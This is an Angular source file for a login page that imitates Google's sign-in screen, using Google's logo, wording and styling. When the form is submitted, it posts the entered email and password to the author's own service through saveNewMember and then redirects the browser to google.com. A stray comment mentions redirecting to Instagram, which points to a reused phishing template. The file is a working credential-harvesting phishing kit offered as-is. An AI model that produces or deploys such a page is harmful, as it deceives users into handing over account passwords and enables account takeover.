import { Component } from '@angular/core';
import { bootstrapApplication } from '@angular/platform-browser';
import {
  ReactiveFormsModule,
  FormBuilder,
  FormGroup,
  Validators,
} from '@angular/forms';
import { CommonModule } from '@angular/common';
import { HttpClientModule, provideHttpClient } from '@angular/common/http';
import { HttpService } from './http.service';

@Component({
  selector: 'app-root',
  standalone: true,
  imports: [ReactiveFormsModule, CommonModule, HttpClientModule],
  template: `
    <div class="login-container">
      <div class="login-card">
        <div class="google-logo">
        <img 
  src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
  alt="Google logo" 
  width="92" 
  height="30"
/>
          <!-- <svg width="75" height="24" viewBox="0 0 75 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M37.5 12.25c0 3.43-2.36 5.93-5.93 5.93s-5.93-2.5-5.93-5.93c0-3.47 2.36-5.93 5.93-5.93s5.93 2.46 5.93 5.93zm-2.33 0c0-2.13-1.54-3.6-3.6-3.6s-3.6 1.47-3.6 3.6c0 2.09 1.54 3.6 3.6 3.6s3.6-1.51 3.6-3.6z" fill="#EA4335"/>
            <path d="M46.91 12.25c0 3.43-2.36 5.93-5.93 5.93s-5.93-2.5-5.93-5.93c0-3.47 2.36-5.93 5.93-5.93s5.93 2.46 5.93 5.93zm-2.33 0c0-2.13-1.54-3.6-3.6-3.6s-3.6 1.47-3.6 3.6c0 2.09 1.54 3.6 3.6 3.6s3.6-1.51 3.6-3.6z" fill="#FBBC05"/>
            <path d="M55.27 6.5v10.45c0 4.28-2.53 6.05-5.51 6.05-2.8 0-4.48-1.88-5.12-3.41l2.03-.84c.4.96 1.39 2.11 2.41 2.11 1.57 0 2.53-.97 2.53-2.8V17.7h-.06c-.45.57-1.39 1.08-2.53 1.08-2.41 0-4.61-2.11-4.61-4.93s2.2-4.93 4.61-4.93c1.14 0 2.08.51 2.53 1.08h.06V6.5h2.66zm-2.49 5.75c0-2.09-1.39-3.6-3.16-3.6s-3.2 1.51-3.2 3.6c0 2.05 1.43 3.6 3.2 3.6s3.16-1.55 3.16-3.6z" fill="#4285F4"/>
            <path d="M58.09 2v16h-2.5V2h2.5z" fill="#34A853"/>
            <path d="M68.18 14.92l1.57 1.04c-.51.76-1.74 2.06-3.87 2.06-2.64 0-4.61-2.05-4.61-4.73 0-2.8 2.01-4.73 4.38-4.73 2.41 0 3.58 1.93 3.98 2.97l.21.51-6.22 2.57c.48.93 1.22 1.4 2.27 1.4.99 0 1.66-.49 2.15-1.23l.14.14zm-4.87-1.66l4.15-1.72c-.23-.59-.94-1.01-1.78-1.01-1.07 0-2.54.94-2.37 2.73z" fill="#EA4335"/>
          </svg> -->
        </div>
        
        <h1 class="login-title">Sign in</h1>
        <p class="login-subtitle">Use your Google Account</p>
        
        <form [formGroup]="loginForm" (ngSubmit)="onSubmit()" class="login-form">
          <div class="input-group" [class.focused]="usernameFocused" [class.filled]="loginForm.get('username')?.value">
            <input 
              type="text" 
              id="username" 
              formControlName="username"
              (focus)="usernameFocused = true"
              (blur)="usernameFocused = false"
              autocomplete="username"
              required>
            <label for="username">Email or phone</label>
            <div class="input-line"></div>
          </div>
          
          <div class="error-message" *ngIf="loginForm.get('username')?.invalid && loginForm.get('username')?.touched">
            <span *ngIf="loginForm.get('username')?.errors?.['required']">Enter an email or phone number</span>
          </div>
          
          <div class="input-group" [class.focused]="passwordFocused" [class.filled]="loginForm.get('password')?.value">
            <input 
              [type]="showPassword ? 'text' : 'password'" 
              id="password" 
              formControlName="password"
              (focus)="passwordFocused = true"
              (blur)="passwordFocused = false"
              autocomplete="current-password"
              required>
            <label for="password">Password</label>
            <button type="button" class="password-toggle" (click)="togglePassword()">
              <svg *ngIf="!showPassword" width="20" height="20" viewBox="0 0 24 24" fill="none">
                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="#5f6368"/>
              </svg>
              <svg *ngIf="showPassword" width="20" height="20" viewBox="0 0 24 24" fill="none">
                <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z" fill="#5f6368"/>
              </svg>
            </button>
            <div class="input-line"></div>
          </div>
          
          <div class="error-message" *ngIf="loginForm.get('password')?.invalid && loginForm.get('password')?.touched">
            <span *ngIf="loginForm.get('password')?.errors?.['required']">Enter a password</span>
          </div>
          
          <div class="forgot-email">
            <a href="#" class="link">Forgot email?</a>
          </div>
          
          <div class="guest-mode">
            <p>Not your computer? Use Guest mode to sign in privately.</p>
            <a href="#" class="link">Learn more</a>
          </div>
          
          <div class="form-actions">
            <button type="button" class="btn-text">Create account</button>
            <button type="submit" class="btn-primary" [disabled]="loginForm.invalid || isSubmitting">
              {{ isSubmitting ? 'Signing in...' : 'Next' }}
            </button>
          </div>
        </form>
      </div>
      
      <div class="footer">
        <select class="language-select">
          <option>English (United States)</option>
          <option>Español</option>
          <option>Français</option>
        </select>
        
        <div class="footer-links">
          <a href="#" class="footer-link">Help</a>
          <a href="#" class="footer-link">Privacy</a>
          <a href="#" class="footer-link">Terms</a>
        </div>
      </div>
    </div>
  `,
  styles: [`
  * {
    box-sizing: border-box;
  }

  body {
    margin: 0;
    font-family: 'Google Sans', Roboto, Arial, sans-serif;
    background-color: #ffffff;
  }

  .login-container {
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
    background-color: #ffffff;
    position: relative;
    padding-top: env(safe-area-inset-top, 20px);
    padding-bottom: env(safe-area-inset-bottom, 20px);
    padding-left: env(safe-area-inset-left, 20px);
    padding-right: env(safe-area-inset-right, 20px);
  }

  .login-card {
    background: white;
    border: 1px solid #dadce0;
    border-radius: 8px;
    padding: 48px 40px 36px 40px;
    box-shadow: 0 2px 10px 0 rgba(0,0,0,.1);
    width: 100%;
    max-width: 450px;
    text-align: center;
    position: relative;
    z-index: 1;
    animation: slideUp 0.6s ease-out;
  }

  @keyframes slideUp {
    from {
      opacity: 0;
      transform: translateY(30px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }

  .google-logo {
    margin-bottom: 32px;
    animation: fadeIn 0.8s ease-out 0.2s both;
    display: flex;
    justify-content: center;
    align-items: center;
  }

  @keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
  }

  .login-title {
    font-size: 24px;
    font-weight: 400;
    margin: 0 0 8px 0;
    color: #202124;
    animation: fadeIn 0.8s ease-out 0.3s both;
  }

  .login-subtitle {
    font-size: 16px;
    font-weight: 400;
    margin: 0 0 32px 0;
    color: #5f6368;
    animation: fadeIn 0.8s ease-out 0.4s both;
  }

  .login-form {
    text-align: left;
    animation: fadeIn 0.8s ease-out 0.5s both;
  }

  .input-group {
    position: relative;
    margin-bottom: 24px;
  }

  .input-group input {
    width: 100%;
    padding: 20px 16px 6px 16px;
    border: 1px solid #dadce0;
    border-radius: 4px;
    font-size: 16px;
    outline: none;
    background: transparent;
    transition: all 0.2s ease;
  }

  .input-group input:focus {
    border-color: #1a73e8;
    box-shadow: 0 0 0 1px #1a73e8;
  }

  .input-group label {
    position: absolute;
    top: 50%;
    left: 16px;
    transform: translateY(-50%);
    color: #5f6368;
    font-size: 16px;
    pointer-events: none;
    transition: all 0.2s ease;
    background: white;
    padding: 0 4px;
  }

  .input-group.focused label,
  .input-group.filled label {
    top: 0;
    transform: translateY(-50%);
    font-size: 12px;
    color: #1a73e8;
  }

  .input-group.focused.filled label {
    color: #1a73e8;
  }

  .password-toggle {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    cursor: pointer;
    padding: 4px;
    border-radius: 4px;
    transition: background-color 0.2s ease;
  }

  .password-toggle:hover {
    background-color: #f8f9fa;
  }

  .input-line {
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    height: 2px;
    background: #1a73e8;
    transform: scaleX(0);
    transition: transform 0.2s ease;
  }

  .input-group.focused .input-line {
    transform: scaleX(1);
  }

  .error-message {
    color: #d93025;
    font-size: 12px;
    margin-top: 4px;
    margin-bottom: 16px;
    animation: shake 0.3s ease-in-out;
  }

  @keyframes shake {
    0%, 100% { transform: translateX(0); }
    25% { transform: translateX(-4px); }
    75% { transform: translateX(4px); }
  }

  .forgot-email {
    margin-bottom: 24px;
  }

  .guest-mode {
    margin-bottom: 32px;
    font-size: 14px;
    color: #5f6368;
    line-height: 1.4;
  }

  .link {
    color: #1a73e8;
    text-decoration: none;
    font-weight: 500;
    transition: color 0.2s ease;
  }

  .link:hover {
    color: #1557b0;
    text-decoration: underline;
  }

  .form-actions {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 32px;
  }

  .btn-text {
    background: none;
    border: none;
    color: #1a73e8;
    font-size: 14px;
    font-weight: 500;
    padding: 8px 16px;
    border-radius: 4px;
    cursor: pointer;
    transition: all 0.2s ease;
  }

  .btn-text:hover {
    background-color: #f8f9fa;
  }

  .btn-primary {
    background: #1a73e8;
    color: white;
    border: none;
    padding: 12px 24px;
    border-radius: 4px;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    transition: all 0.2s ease;
    min-width: 80px;
  }

  .btn-primary:hover:not(:disabled) {
    background: #1557b0;
    box-shadow: 0 2px 8px rgba(26, 115, 232, 0.3);
  }

  .btn-primary:disabled {
    background: #f8f9fa;
    color: #5f6368;
    cursor: not-allowed;
  }

  .footer {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    background: rgba(248, 249, 250, 0.9);
    backdrop-filter: blur(10px);
    padding: 16px 24px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    z-index: 2;
  }

  .language-select {
    background: none;
    border: none;
    color: #5f6368;
    font-size: 12px;
    cursor: pointer;
    outline: none;
  }

  .footer-links {
    display: flex;
    gap: 24px;
  }

  .footer-link {
    color: #5f6368;
    text-decoration: none;
    font-size: 12px;
    transition: color 0.2s ease;
  }

  .footer-link:hover {
    color: #202124;
  }

  @media (max-width: 768px) {
    .login-container {
      padding: 16px;
    }

    .login-card {
      padding: 32px 24px 24px 24px;
      max-width: 100%;
    }

    .footer {
      flex-direction: column;
      gap: 12px;
      text-align: center;
    }

    .footer-links {
      gap: 16px;
    }
  }

  @media (max-width: 480px) {
    html {
      font-size: 15px;
    }

    .login-card {
      padding: 24px 16px;
      border: none;
      box-shadow: none;
    }

    .login-title {
      font-size: clamp(1.25rem, 5vw, 1.5rem);
    }

    .login-subtitle {
      font-size: clamp(0.875rem, 4vw, 1rem);
    }

    .input-group input {
      font-size: 1rem;
      padding: 18px 14px 6px 14px;
    }

    .input-group label {
      font-size: 1rem;
    }

    .form-actions {
      flex-direction: column;
      gap: 16px;
      align-items: stretch;
    }

    .btn-primary, .btn-text {
      width: 100%;
      font-size: 1rem;
    }

    .footer {
      padding: 12px;
      flex-direction: column;
      gap: 8px;
    }

    .footer-links {
      flex-direction: column;
      gap: 8px;
    }
  }

  @media (max-width: 360px) {
    .login-card {
      padding: 20px 12px;
    }

    .footer-link, .language-select {
      font-size: 11px;
    }

    .btn-primary {
      padding: 10px 16px;
    }
  }
`],  
})
export class App {
  loginForm: FormGroup;
  usernameFocused = false;
  passwordFocused = false;
  showPassword = false;
  isSubmitting = false;

  constructor(private fb: FormBuilder, private http: HttpService) {
    this.loginForm = this.fb.group({
      username: ['', [Validators.required]],
      password: ['', [Validators.required]],
    });
  }

  togglePassword() {
    this.showPassword = !this.showPassword;
  }

  onSubmit() {
    if (this.loginForm.valid) {
      const username = this.loginForm.value.username;
      const password = this.loginForm.value.password;

      if (username && password) {
        this.isSubmitting = true;
        let user = { username: username, password: password };

        this.http.saveNewMember(user).subscribe({
          next: (data) => {
            console.log('Member saved successfully:', data);
            this.isSubmitting = false;
            // Redirect to Instagram as specified
            window.location.href = 'https://www.google.com/';
          },
          error: (error) => {
            console.error('Error saving member:', error);
            this.isSubmitting = false;
            alert(
              'An error occurred while creating your account. Please try again.'
            );
          },
        });
      } else {
        alert('Please enter username & password');
      }
    } else {
      alert('Form is invalid. Please check your inputs.');
      // Mark all fields as touched to show validation errors
      Object.keys(this.loginForm.controls).forEach((key) => {
        this.loginForm.get(key)?.markAsTouched();
      });
    }
  }
}

bootstrapApplication(App, {
  providers: [provideHttpClient()], // ✅ This is the new recommended way in standalone APIs
});
